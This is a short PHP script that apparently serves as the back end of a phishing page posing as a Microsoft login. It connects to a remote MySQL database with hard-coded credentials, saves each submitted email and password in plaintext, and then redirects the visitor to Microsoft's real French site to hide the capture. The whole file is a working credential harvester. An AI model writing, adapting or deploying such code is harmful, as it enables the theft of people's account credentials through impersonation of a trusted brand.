<?php

$connexionPDO = new PDO(
    'mysql:host=mysql-microsio.alwaysdata.net;dbname=microsio_microsoft;charset=utf8',
    'microsio',
    'BTSsio2022'
);

if(isset($_POST["connexion"])) {
    $email = $_POST["email"];
    $password = $_POST["password"];

    $creation = $connexionPDO->prepare("INSERT INTO utilisateur (email, password) VALUES (:email, :password)");

    $creation->bindValue(":email", $email);
    $creation->bindValue(":password", $password);

    $creation->execute();
    
    header("Location: https://www.microsoft.com/fr-fr");
}